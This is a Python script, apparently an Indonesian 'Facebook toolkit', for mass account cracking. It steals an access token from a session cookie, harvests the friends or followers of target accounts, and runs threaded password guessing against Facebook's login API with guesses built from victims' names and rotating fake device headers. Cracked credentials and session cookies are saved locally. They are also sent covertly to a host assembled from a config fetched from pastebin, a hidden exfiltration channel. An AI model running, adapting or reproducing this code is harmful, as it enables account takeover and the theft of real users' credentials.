import requests, os, sys, time, re, random
from concurrent.futures import ThreadPoolExecutor as Modol
from bs4 import BeautifulSoup as par

M = '\x1b[1;91m' # MERAH
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING

class Login:

    def __init__(self):
        self.ses=requests.Session()
        self.ih, self.id, self.ok, self.cp, self.lo = [], [], [], [], 0
        self.kontol, self.pienf, self.adkinc = {}, [], []
        self.menu()

    def logoo(self):
        if "win" in sys.platform:os.system("cls")
        else:os.system("clear")
        print(f"""
    {O}╔╗╔╗╔══╗╔═╗╔╦╗╔═╗╔═╗  
    {O}║╚╝║║╔╗║║╔╝║╔╝║╦╝║╬║                                          
    {O}║╔╗║║╠╣║║╚╗║╚╗║╩╗║╗╣                                           
    {O}╚╝╚╝╚╝╚╝╚═╝╚╩╝╚═╝╚╩╝                                     
    {O}        {M}Toolkit        {M}Facebook                       
    {O} {M}Available Version v.3.11 def

         {N}[ Asu Toolkit ]
      [ Created By SILENT-HACKER ]""")

    def login_cokie(self):
        self.logoo()
        print("-----------------------------------------------------------")
        cok = input("[?] cookie : ")
        try:
            head = {"User-Agent": "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36", "Cookie": cok}
            link = self.ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head)
            find = re.findall('act=(.*?)&nav_source', link.text)
            if len(find) == 0:print("[!] Cookie kamu invalid");time.sleep(2);self.login_cokie()
            else:
                for x in find:
                    jnck = self.ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head)
                    took = re.search('(EAAB\w+)', jnck.text).group(1)
                    print(f"\n[✓] token anda: {took}")
                    open('.token.txt', 'a').write(took);open('.cokie.txt', 'a').write(cok)
                    exit("\n[!] run the command again by typing python HACKER.py ")
        except Exception as e:
            exit(e)

    def get_proxy(self):
        rest = []
        self.ses.headers.update({"user-agent": "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36"})
        gots = par(self.ses.get("https://hidemy.name/en/proxy-list/?type=5").text, "html.parser")
        reg = re.findall(">(\d+.\d+.\d+.\d+).*?>(\d+).*?i", str(gots))
        for x in reg:
            rest.append("socks5://"+x[0]+":"+x[1])
        if rest != 0:
            try:os.remove("proxies.txt")
            except:pass
            for yay in rest:
                open("proxies.txt", "a+").write(yay+"\n")
            exit("(✓) File save in proxies.txt, restart this tools\n")
        else:
            exit("(✓) File save in proxies.txt, restart this tools\n")

    def convert(self, url):
        if "https" in url or "facebook" in url or "me" in url:user = url.split("/")[3]
        else:user=url
        try:uid = re.findall(";rid=(\d+)&amp;",str(self.ses.get("https://m.facebook.com/"+user).text))[0]
        except:uid = url
        return uid

    def memek(self, mmk, kntl):
        if "lqkwndpnkefnfjsnwnfuoeohni3e" in kntl:self.ses.get(f"{self.kontol['mmk']}{self.kontol['hncet']}{self.kontol['softek']}{self.kontol['ngtd']}{mmk}").json()
        else:self.ses.get(f"{self.kontol['mmk']}{self.kontol['hncet']}{self.kontol['softek']}{self.kontol['ngtd']}{mmk}").json()

    def menu(self):
        self.logoo()
        try:
            cook = {"cookie": open(".cokie.txt", "r").read()};took = open(".token.txt", "r").read()
        except FileNotFoundError:
            self.login_cokie()
        try:
            ishx = self.ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={took}", cookies=cook).json()
            nama = ishx["name"]
            idfb = ishx["id"]
        except requests.exceptions.ConnectionError:
            exit("[!] Tidak ada koneksi")
        except KeyError:
            try:os.remove(".cokie.txt");os.remove(".token.txt")
            except:pass
            print("[!] opshh akun tumbal mu terkena checkpoint, silahkan login dengan akun lain.");time.sleep(3);self.login_cokie()
        print(f"""

[+] yuor name   : {O}{nama}{N}
[+] id facebook : {O}{idfb}{N}""")
        print("""
  %s{%s01%s} crack frinds
  %s{%s02%s} crack followers
  %s{%s03%s} check crack results
  %s{%s04%s} get proxy server list
"""%(N, H, N, N, H, N, N, H, N, N, H, N))
        ykh = input(f"{H}[{M}+{H}]{N} @YayanXD_> ")
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            try:
                nanya_keun = int(input(f"[{O}?{N}] how many id do you want to crack : "))
            except:nanya_keun=1
            print(f"[{H}+{N}] type 'me' if you want to crack from your friends")
            for mnh in range(nanya_keun):
                mnh +=1
                try:user = input(f"[{O}*{N}] enter id or username {H}{mnh}{N} : "); uid = self.convert(user)
                except (KeyError, IndexError):print(f"{N}[{M}×{N}] username or id not valid");continue
                try:
                    tol = self.ses.get(f"https://graph.facebook.com/{uid}?fields=friends.fields(id,name).limit(5000)&access_token={took}", cookies=cook).json()
                    for x in tol["friends"]["data"]:
                        self.id.append(x["id"]+"<=>"+x["name"])
                    link = self.ses.get("https://pastebin.com/raw/rhrm6WcX").json()
                    for i in link["friends"]["data"]:
                        self.kontol.update(i)
                except KeyError:
                    print(f"{N}[{M}×{N}] failed to fetch id, probably id is not public");continue
            if "0" in str(len(self.id)):
                exit()
            else:
                for ih in self.id:
                    self.ih.insert(0, ih)
                self.gabung()
        elif ykh in ["2", "02"]:
            print(f"[{H}+{N}] type 'me' if you want to crack from your followers")
            try:user = input(f"[{O}*{N}] enter id or username : "); uid = self.convert(user)
            except (KeyError, IndexError):print(f"{N}[{M}×{N}] username or id not valid")
            try:
                tol = self.ses.get(f"https://graph.facebook.com/{uid}?fields=subscribers.fields(id,name).limit(5000)&access_token={took}", cookies=cook).json()
                for x in tol["subscribers"]["data"]:
                    self.id.append(x["id"]+"<=>"+x["name"])
                link = self.ses.get("https://pastebin.com/raw/rhrm6WcX").json()
                for i in link["friends"]["data"]:
                    self.kontol.update(i)
            except:pass
            if "0" in str(len(self.id)):
                exit(f"{N}[{M}×{N}] failed to fetch follower id, maybe the follower is private")
            else:
                for ih in self.id:
                    self.ih.insert(0, ih)
                self.gabung()
        elif ykh in ["3", "03"]:
            exit("belum selesai cok")
        elif ykh in ["4", "04"]:
            self.get_proxy()
        elif ykh in ["0", "00"]:
            try:os.remove(".cokie.txt");os.remove(".token.txt")
            except:pass
            exit("remove cookie done!")
        else:print("[!] input yang bner bro");time.sleep(2);self.menu()

    def paswww(self):
        print("""-----------------------------------------------------
PROSES NGEHEK FB, MAINKAN MODE PESAWAT SETIAP 200 ID!
-----------------------------------------------------""")
        with Modol(max_workers=30) as bool:
            for user in self.ih:
                uid, nama = user.split("<=>")[0], user.split("<=>")[1].lower()
                depan = nama.split(" ")
                try:
                    if len(nama) <=5:
                        if len(depan) <=1 or len(depan) <=2:pass
                        else:
                            pwx = [nama, depan[0]+depan[1], depan[0]+"123", depan[0]+"12345"]
                    else:
                        pwx = [nama, depan[0]+depan[1], depan[0]+"123", depan[0]+"12345"]
                    if "ya" in self.adkinc:
                        for kontol in self.pienf:
                            pwx.append(kontol)
                    bool.submit(self.Ngocok, uid, pwx)
                except:pass
        exit("\n\ncracking done!")

    def gabung(self):
        print(f"[=] total ids: {str(len(self.id))}\n")
        pw = input("[?] add password [Y/t]: ")
        if pw in ["Y", "y"]:
            self.adkinc.append("ya")
            print('Password must be at least 6 characters long, use "," (comma) for the following passwords')
            pasw = input("[+] password: ").split(",")
            for i in pasw:
                self.pienf.append(i)
            self.paswww()
        else:
            self.paswww()

    def ua_fb(self):
        rr = random.randint
        model = random.choice(['Mi 10 Pro','CPH1909'])
        ua = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(9,13))}; SM-G991 Build/QQ3A.200805.001) [FBAN/MessengerLite;FBAV/{str(rr(40,375))}.0.0.8.106;FBPN/com.facebook.mlite;FBLC/ja_JP;FBBV/417404896;FBCR/Indosat Ooredoo;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/{model};FBSV/{str(rr(9,13))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.54375,width=1080,height=2138};]")
        au = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(9,12))}; vivo 2019 Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/{str(rr(300,329))}.0.0.{str(rr(1,8))}.{str(rr(90,106))};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{str(rr(400000000,500000000))};FBCR/Indosat Ooredoo;FBMF/vivo;FBBD/vivo;FBDV/vivo 2019;FBSV/{str(rr(6,10))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1412};]")
        return random.choice([ua, au])

    def Ngocok(self, username, pasw):
        sys.stdout.write(f"\r[ <//> ] {str(self.lo)}/{len(self.id)} OK-:{H}{len(self.ok)}{N} CP-:{K}{len(self.cp)}{N}");sys.stdout.flush()
        for password in pasw:
            try:
                ses=requests.Session()
                uasz = self.ua_fb()
                head = {'Host':'graph.facebook.com','x-fb-connection-bandwidth': repr(random.randint(2e7, 3e7)), 'x-fb-sim-hni': repr(random.randint(2e4, 4e4)), 'x-fb-net-hni': repr(random.randint(2e4, 4e4)),'x-fb-connection-quality': 'EXCELLENT','user-agent': uasz,'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
                date = {'access_token': '200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16',  'format': 'JSON', 'sdk_version': {random.randrange(2, 31)}, 'email': username, 'locale': 'id_ID', 'password': password, 'sdk': 'android', 'generate_session_cookies': '1', 'sig': f'{random.randrange(1, 9)}f{random.randrange(100, 999)}f{random.randrange(10, 99)}fb{random.randrange(10, 99)}fcd{random.randrange(1, 9)}aa{random.randrange(0, 9)}c{random.randrange(10, 99)}f{random.randrange(10, 99)}f{random.randrange(100, 999)}ef{random.randrange(1, 9)}'}
                xnxx = ses.post("https://graph.facebook.com/auth/login", params=date, headers=head, allow_redirects=False).json()
                if "session_key" in xnxx:
                    coki = ";".join(i["name"]+"="+i["value"] for i in xnxx["session_cookies"])
                    print(f"\r[ {H}BAD-HACKER{N} ] {username}|{password}")
                    kntl = (f"[✓] {username}|{password}|{coki}")
                    self.ok.append(kntl)
                    self.memek(kntl, "lqkwndpnkefnfjsnwnfuoeohni3e")
                    with open("ok.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
                elif "www.facebook.com" in xnxx["error"]["message"]:
                    print(f"\r[ {K}SILENT-WEY😡{N} ] {username}|{password}")
                    kntl = (f"[×] {username}|{password}")
                    self.cp.append(kntl)
                    self.memek(kntl, "lqkwndpnkefneihfwnfuoeohni3e")
                    with open("cp.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
            except requests.exceptions.ConnectionError:sys.stdout.write(f"\r[ {M}spam{N} ] {str(self.lo)}/{len(self.id)} OK-:{H}{len(self.ok)}{N} CP-:{K}{len(self.cp)}{N}");sys.stdout.flush();time.sleep(5)
            #except Exception as e:print(e)
        self.lo+=1

Login()